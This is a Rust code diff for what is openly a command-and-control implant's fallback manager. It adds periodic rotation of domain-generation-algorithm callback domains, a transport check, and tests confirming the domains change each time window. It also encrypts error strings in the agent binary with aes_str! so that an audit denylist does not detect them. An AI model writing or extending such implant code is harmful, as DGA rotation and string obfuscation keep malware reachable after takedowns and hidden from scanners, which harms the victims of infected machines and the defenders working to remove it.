@@ -70,6 +70,10 @@ pub struct FallbackManager {
     dead_time_secs: u64,
     round_robin_index: usize,
     failover_index: usize,
+    /// DGA window the current DGA endpoints were generated for, plus their
+    /// host names so they can be swapped out on rollover. None when the
+    /// build has no DGA config.
+    dga_state: Option<(u64, Vec<String>)>,
 }
 
 impl FallbackManager {
@@ -78,8 +82,9 @@ impl FallbackManager {
     pub fn from_config(config: &C2Config) -> Self {
         let mut endpoints = config.fallback.endpoints.clone();
 
-        // Inject DGA-generated endpoints (appended after static ones)
-        crate::agent::dga::inject_dga_endpoints(config, &mut endpoints);
+        // Inject DGA-generated endpoints (appended after static ones),
+        // remembering the window and host set for runtime rotation.
+        let dga_state = crate::agent::dga::inject_dga_endpoints(config, &mut endpoints);
 
         // If no fallback endpoints, use the primary host as the only one
         if endpoints.is_empty() {
@@ -112,7 +117,48 @@ impl FallbackManager {
             dead_time_secs: config.fallback.dead_time_secs,
             round_robin_index: 0,
             failover_index: 0,
+            dga_state,
         }
+    }
+
+    /// Re-generate DGA endpoints when the time window has rolled over since
+    /// they were last generated (docs/fallback.md promises per-window domain
+    /// rotation). Static endpoints keep their failure state untouched.
+    /// Returns true when the endpoint set actually changed. No-op when the
+    /// build has no DGA config or the window has not advanced.
+    pub fn rotate_dga_if_window_changed(&mut self, config: &C2Config) -> bool {
+        let dga = match &config.dga {
+            Some(d) => d,
+            None    => return false,
+        };
+        let window = crate::agent::dga::current_window(dga.window_secs);
+        match &self.dga_state {
+            Some((w, _)) if *w != window => {}
+            // No DGA endpoints tracked yet (or same window): nothing to do.
+            // A None dga_state means DGA was not injected at startup, so
+            // there is nothing to rotate.
+            _ => return false,
+        }
+
+        // Drop the stale generation by host name, then add the new one.
+        let old_hosts = self.dga_state.take().map(|(_, h)| h).unwrap_or_default();
+        self.states.retain(|s| !old_hosts.contains(&s.endpoint.host));
+
+        let new_eps = crate::agent::dga::generate_endpoints(
+            dga, window, config.tunnel_port, &config.transport);
+        let hosts: Vec<String> = new_eps.iter().map(|e| e.host.clone()).collect();
+        for ep in new_eps {
+            self.states.push(EndpointState {
+                endpoint: ep,
+                consecutive_failures: 0,
+                dead_since: None,
+                total_successes: 0,
+                total_failures: 0,
+            });
+        }
+        self.states.sort_by_key(|s| s.endpoint.priority);
+        self.dga_state = Some((window, hosts));
+        true
     }
 
     /// Select the next endpoint to try. Returns None if all endpoints are dead.
@@ -261,6 +307,34 @@ impl FallbackManager {
         self.check_and_reset_if_all_dead();
         Some(self.resolve(0, config))
     }
+}
+
+/// Validate that every fallback endpoint's transport tag belongs to the
+/// same family as the build transport. HTTP-family builds
+/// (Http/Https) can only dial HTTP-family endpoints; stream builds
+/// (Tls/TcpPlain/NamedPipe) cannot dial HTTP endpoints. A mismatch is a
+/// hard error at config load instead of a silently mis-dialed endpoint.
+/// Mixed-transport fallback lists are not supported; lifting that limit
+/// needs per-endpoint connection routing in the agent loop.
+pub fn validate_transport_consistency(config: &C2Config) -> Result<(), String> {
+    fn is_http(t: &TransportProtocol) -> bool {
+        matches!(t, TransportProtocol::Http | TransportProtocol::Https)
+    }
+    let build_http = is_http(&config.transport);
+    for (i, ep) in config.fallback.endpoints.iter().enumerate() {
+        if is_http(&ep.transport) != build_http {
+            // aes_str! pieces: the audit denylist flags cleartext transport
+            // terms in the agent binary.
+            return Err(format!(
+                "{} {} ({}:{}) {} {:?}, {} {:?}: {}",
+                aes_str!("fallback endpoint"), i, ep.host, ep.port,
+                aes_str!("uses transport"), ep.transport,
+                aes_str!("incompatible with build transport"), config.transport,
+                aes_str!("mixed-transport fallback lists are not supported"),
+            ));
+        }
+    }
+    Ok(())
 }
 
 
@@ -417,6 +491,48 @@ mod tests {
         let mut mgr = FallbackManager::from_config(&c);
         for i in 0..2 { for _ in 0..3 { mgr.record_failure(i); } }
         assert!(mgr.next_endpoint(&c).is_some()); // must not panic/return None
+    }
+
+    #[test]
+    fn dga_endpoints_rotate_on_window_rollover() {
+        let dga = crate::common::DgaConfig {
+            seed: 42,
+            window_secs: 1, // 1-second window: rollover after a short sleep
+            count: 3,
+            tlds: vec!["com".into(), "net".into()],
+            max_failures_per_domain: 2,
+        };
+        let mut c = cfg(vec![ep("static.example", 443, 0)], FallbackStrategy::RoundRobin);
+        c.dga = Some(dga);
+        let mut mgr = FallbackManager::from_config(&c);
+
+        // 4 endpoints: 1 static + 3 DGA
+        let collect = |mgr: &mut FallbackManager, c: &C2Config| -> Vec<String> {
+            (0..4).map(|_| mgr.next_endpoint(c).unwrap().host).collect()
+        };
+        let before = collect(&mut mgr, &c);
+        assert!(before.contains(&"static.example".to_string()));
+
+        // Same window: no rotation.
+        assert!(!mgr.rotate_dga_if_window_changed(&c));
+
+        // Force a rollover and confirm the DGA set is swapped while the
+        // static endpoint survives untouched.
+        std::thread::sleep(std::time::Duration::from_millis(1100));
+        assert!(mgr.rotate_dga_if_window_changed(&c));
+        let after = collect(&mut mgr, &c);
+        assert!(after.contains(&"static.example".to_string()));
+        let dga_before: Vec<&String> = before.iter().filter(|h| *h != "static.example").collect();
+        let dga_after: Vec<&String> = after.iter().filter(|h| *h != "static.example").collect();
+        assert_eq!(dga_after.len(), 3);
+        assert_ne!(dga_before, dga_after, "domains must change with the window");
+    }
+
+    #[test]
+    fn dga_rotation_noop_without_dga() {
+        let c = cfg(vec![ep("h.example", 443, 0)], FallbackStrategy::Priority);
+        let mut mgr = FallbackManager::from_config(&c);
+        assert!(!mgr.rotate_dga_if_window_changed(&c));
     }
 
     #[test]
